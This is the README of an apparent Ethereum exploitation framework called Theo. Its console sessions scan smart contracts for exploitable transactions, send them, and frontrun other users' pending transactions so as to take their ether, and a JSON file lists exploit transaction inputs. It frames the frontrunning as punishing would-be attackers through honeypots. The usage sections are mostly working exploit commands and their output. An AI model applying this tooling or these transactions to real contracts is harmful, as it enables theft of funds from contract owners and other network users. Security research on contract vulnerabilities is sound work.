**Readme is obsolete; will be rewritten until 2019-08-31.**

# Theo

Theo aims to be an exploitation framework or a blockchain recon and interaction tool.

Features:

- automatic smart contract scanning which generates a list of possible exploits.
- generating and sending transactions to exploit a smart contract.
- waiting for an actor to interact with a monitored smart contract, in order to frontrun them.
- web3 console

![Theo](./static/theo-profile.png)

He knows [Karl](https://github.com/cleanunicorn/karl) from work.

Theo's purpose is to fight script kiddies that try to be leet hackers. He can listen to them trying to exploit his honeypots and make them lose their funds, for his own gain.

> "You didn't bring me along for my charming personality."

## Install

Theo is available as a PyPI package:

```console
$ pip install theo
$ theo --help
usage: theo [-h] [--rpc-http RPC_HTTP] [--rpc-ws RPC_WS] [--rpc-ipc RPC_IPC]
            [--account-pk ACCOUNT_PK] [--contract ADDRESS]
            [--skip-mythril SKIP_MYTHRIL] [--load-file LOAD_FILE] [--version]

Monitor contracts for balance changes or tx pool.

optional arguments:
  -h, --help            show this help message and exit
  --rpc-http RPC_HTTP   Connect to this HTTP RPC (default:
                        http://127.0.0.1:8545)
  --account-pk ACCOUNT_PK
                        The account's private key (default: None)
  --contract ADDRESS    Contract to monitor (default: None)
  --skip-mythril SKIP_MYTHRIL
                        Don't try to find exploits with Mythril (default:
                        False)
  --load-file LOAD_FILE
                        Load exploit from file (default: )
  --version             show program's version number and exit

RPC connections:
  --rpc-ws RPC_WS       Connect to this WebSockets RPC (default: None)
  --rpc-ipc RPC_IPC     Connect to this IPC RPC (default: None)
```

Install from sources

```console
$ git clone https://github.com/cleanunicorn/theo
$ cd theo
$ virtualenv ./venv
$ . ./venv/bin/activate
$ pip install -r requirements.txt
$ pip install -e .
$ theo --help
```

Requirements: 

- Python 3.5 or higher.
- An Ethereum node with RPC available. [Ganache](https://github.com/trufflesuite/ganache-cli) works really well for testing or for validating exploits.

## Demos

### Find exploit and run it

Scan a smart contract, find exploits, exploit it:

- Start Ganache as our local Ethereum node
- Deploy the vulnerable contract (happens in a different window)
- Scan for exploits
- Run exploit

[![asciicast](https://asciinema.org/a/CgTH8tIAoGsgEYsd7XN65tJSp.svg)](https://asciinema.org/a/CgTH8tIAoGsgEYsd7XN65tJSp)

### Frontrun victim

Setup a honeypot, deploy honeypot, wait for attacker, frontrun:

- Start geth as our local Ethereum node
- Start mining
- Deploy the honeypot
- Start Theo and scan the mem pool for transactions
- Frontrun the attacker and steal his ether

[![asciicast](https://asciinema.org/a/n2HnSJvgopf8AKCoSfEJVgvxU.svg)](https://asciinema.org/a/n2HnSJvgopf8AKCoSfEJVgvxU?speed=2)

## Usage

### Help screen

It's a good idea to check the help screen first.

```console
$ python ./theo.py --help
usage: theo.py [-h] [--rpc-http RPC_HTTP] [--rpc-ws RPC_WS]
               [--rpc-ipc RPC_IPC] [--account ACCOUNT] [--contract ADDRESS]
               [--txs {mythril,file}] [--txs-file FILE]
               {tx-pool}

Monitor contracts for balance changes or tx pool.

positional arguments:
  {tx-pool}             Choose between: balance (not implemented: monitor
                        contract balance changes), tx-pool (if any
                        transactions want to call methods).

optional arguments:
  -h, --help            show this help message and exit
  --contract ADDRESS    Contract to monitor

Monitor transaction pool:
  --rpc-http RPC_HTTP   Connect to this HTTP RPC
  --rpc-ws RPC_WS       Connect to this WebSockets RPC
  --rpc-ipc RPC_IPC     Connect to this IPC RPC
  --account ACCOUNT     Use this account to send transactions from

Transactions to wait for:
  --txs {mythril,file}  Choose between: mythril (find transactions
                        automatically with mythril), file (use the
                        transactions specified in a JSON file).
  --txs-file FILE       The file which contains the transactions to frontrun
```

### Symbolic execution

A list of expoits is automatically identified using [mythril](https://github.com/ConsenSys/mythril).

Start a session by running:

```console
$ python ./theo.py tx-pool --account=<your unlocked account> --contract=<honeypot>
```

It will analyze the contract and will find a list of available exploits.

```console
$ python theo.py tx-pool --account=0xffcf8fdee72ac11b5c542428b35eef5769c409f0 --contract=0xd833215cbcc3f914bd1c9ece3ee7bf8b14f841bb                                          
Scanning for exploits in contract: 0xd833215cbcc3f914bd1c9ece3ee7bf8b14f841bb
Found exploit(s) [Exploit: (txs=[Transaction: {'input': '0xcf7a8965', 'value': '0xde0b6b3a7640000'}])]
Python 3.7.3 (default, Jun 24 2019, 04:54:02) 
[GCC 9.1.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
(InteractiveConsole)
>>>
```

You can see the available exploits found. In this case one exploit was found. Each exploit is an [Exploit](https://github.com/cleanunicorn/theo/blob/263dc9f0cd34c4a0904529128c93f30b29eae415/theo/scanner/__init__.py#L9) object, having a list of transactions to exploit a bug.

```console
>>> exploits[0]
Exploit: (txs=[Transaction: {'input': '0xcf7a8965', 'value': '0xde0b6b3a7640000'}])
```

You can start the frontrunning monitor to listen for other hackers (script kiddies really) trying to exploit his honeypots.

Use `.frontrun()` to start listening for the exploit and when found send a transaction with a higher gas price.

```console
>>> exploits[0].frontrun()
Waiting for a victim to reach into the honey jar.
Listening for Transaction: {'input': '0xcf7a8965', 'value': '0xde0b6b3a7640000'}.
Found pending tx: 0x74eb78557b4659f27e7a8b82804ae97be9d0adfefd6a5652a097045f6de77a0b from: 0x1df62f291b2e969fb0849d99d9ce41e2f137006e.
Frontrunning with tx: {'from': '0xffcf8fdee72ac11b5c542428b35eef5769c409f0', 'to': '0xd833215cbcc3f914bd1c9ece3ee7bf8b14f841bb', 'gasPrice': '0x3b9aca01', 'input': '0xcf7a8965', 'gas': '0x4c4b40', 'value': '0xde0b6b3a7640000'}
Mined transaction: 0x0b5e7ceedd600eaf013ca8bc74900e6d29b25ed422baaa776f42bec01870a288
```

> "Oh, my God! The quarterback is toast!"

This works very well for some specially crafted [contracts](./contracts/) or some other vulnerable contracts, as long as you make sure frontrunning is in your favor.

### Load transactions from file

Instead of identifying the exploits with mythril, you can specify the list of exploits yourself.

Create a file that looks like this [input-tx.json](./test/input-tx.json):

```json
[
    [
        {
            "input": "0x4e71e0c8",
            "value": "0xde0b6b3a7640000"
        },
        {
            "input": "0x2e64cec1",
            "value": "0x0"
        }
    ],
    [
        {
            "input": "0x4e71e0c8",
            "value": "0xde0b6b3a7640000"
        }
    ]
]
```

This one defines 2 exploits, the first one has 2 transactions and the second one only 1 transaction. After the exploits are loaded, frontrunning is the same.

```console
$ python ./theo.py --txs=file --contract=0xe78a0f7e598cc8b0bb87894b0f60dd2a88d6a8ab --account=0xffcf8fdee72ac11b5c542428b35eef5769c409f0 --txs-file=./test/input-tx.json tx-pool     130 ↵
Found exploits(s) [Exploit: (txs=[Transaction: {'input': '0x4e71e0c8', 'value': '0xde0b6b3a7640000'}, Transaction: {'input': '0x2e64cec1', 'value': '0x0'}]), Exploit: (txs=[Transaction: {'input': '0x4e71e0c8', 'value': '0xde0b6b3a7640000'}])]
Python 3.7.3 (default, Jun 24 2019, 04:54:02) 
[GCC 9.1.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
(InteractiveConsole)
>>> exploits[0].frontrun()
Waiting for a victim to reach into the honey jar.
Listening for Transaction: {'input': '0x4e71e0c8', 'value': '0xde0b6b3a7640000'}.
```

# Troubleshooting

## openssl/aes.h: No such file or directory

If you get this error, you need the libssl source libraries:

```
    scrypt-1.2.1/libcperciva/crypto/crypto_aes.c:6:10: fatal error: openssl/aes.h: No such file or directory
     #include <openssl/aes.h>
              ^~~~~~~~~~~~~~~
    compilation terminated.
    error: command 'x86_64-linux-gnu-gcc' failed with exit status 1
    
    ----------------------------------------
Command "/usr/bin/python3 -u -c "import setuptools, tokenize;__file__='/tmp/pip-build-5rl4ep94/scrypt/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\r\n', '\n');f.close();exec(compile(code, __file__, 'exec'))" install --record /tmp/pip-mnbzx9qe-record/install-record.txt --single-version-externally-managed --compile" failed with error code 1 in /tmp/pip-build-5rl4ep94/scrypt/
```

On Ubuntu you can install them with:
```console
$ sudo apt install libssl-dev
```